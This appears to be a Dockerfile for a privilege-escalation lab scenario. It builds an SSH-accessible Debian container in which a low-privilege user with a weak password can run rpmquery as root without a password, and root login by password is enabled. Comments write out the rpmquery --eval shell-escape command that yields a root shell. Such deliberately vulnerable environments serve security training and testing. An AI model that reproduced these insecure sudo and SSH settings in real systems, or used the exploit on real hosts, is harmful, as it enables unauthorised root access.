FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_rpmquery
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/rpmquery as root
# Known exploit: rpmquery --eval '%(/bin/sh 1>&2)'
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and rpm (which provides rpmquery on Debian)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        rpm \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify rpmquery is installed (on Debian, rpm package provides rpmquery)
RUN which rpmquery && ls -la $(which rpmquery)

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# rpmquery supports --eval which can execute arbitrary shell commands via RPM macros.
# The exploit: sudo rpmquery --eval '%(/bin/sh 1>&2)'
# This spawns an interactive root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/rpmquery" > /etc/sudoers.d/rpmquery && \
    chmod 440 /etc/sudoers.d/rpmquery

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]